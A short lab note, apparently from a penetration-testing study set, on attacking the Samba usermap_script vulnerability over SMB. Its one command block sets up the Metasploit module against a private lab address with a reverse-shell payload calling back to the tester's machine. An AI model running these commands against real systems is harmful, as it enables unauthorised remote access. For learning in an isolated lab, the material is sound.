
---

## ✅ Lab04 – Enumerating & Attacking SMB with Samba Usermap Script

```markdown
# Lab04 – Enumerating & Attacking SMB with Samba Usermap Script
```
## 🧠 Objective
Explore vulnerabilities in the Samba service and attempt exploitation via the usermap_script module.

## 🛠️ Tools
- Metasploit Framework
- Enum4linux (Optional)

## 📁 Exploit Used
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set RPORT 139
set LHOST 192.168.56.1
set payload cmd/unix/reverse
run
